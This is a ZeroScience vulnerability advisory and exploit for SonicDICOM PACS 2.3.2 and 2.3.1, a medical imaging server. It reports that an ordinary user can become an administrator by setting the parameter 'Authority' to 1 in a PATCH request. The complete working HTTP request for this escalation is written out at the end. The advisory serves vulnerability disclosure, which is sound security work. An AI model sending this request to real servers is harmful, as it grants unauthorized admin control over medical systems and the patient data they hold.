@@ -1,0 +1,42 @@
+SonicDICOM PACS 2.3.2 Remote Vertical Privilege Escalation Exploit
+
+
+Vendor: JIUN Corporation
+Product web page: https://www.sonicdicom.com
+Affected version: 2.3.2 and 2.3.1
+
+Summary: SonicDICOM is PACS software that combines the capabilities of
+DICOM Server with web browser based DICOM Viewer.
+
+Desc: The application suffers from a privilege escalation vulnerability.
+Normal user can elevate his/her privileges by sending a HTTP PATCH request
+seting the parameter 'Authority' to integer value '1' gaining admin rights.
+
+Tested on: Microsoft-HTTPAPI/2.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5396
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5396.php
+
+22.11.2016
+
+--
+
+PATCH /viewer/api/accounts/update HTTP/1.1
+Host: 172.19.0.214
+Content-Length: 37
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Escalation Browser/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: {REMOVED_FOR_BREVITY}
+Connection: close
+
+Id=testingus&Name=peend&Authority=1
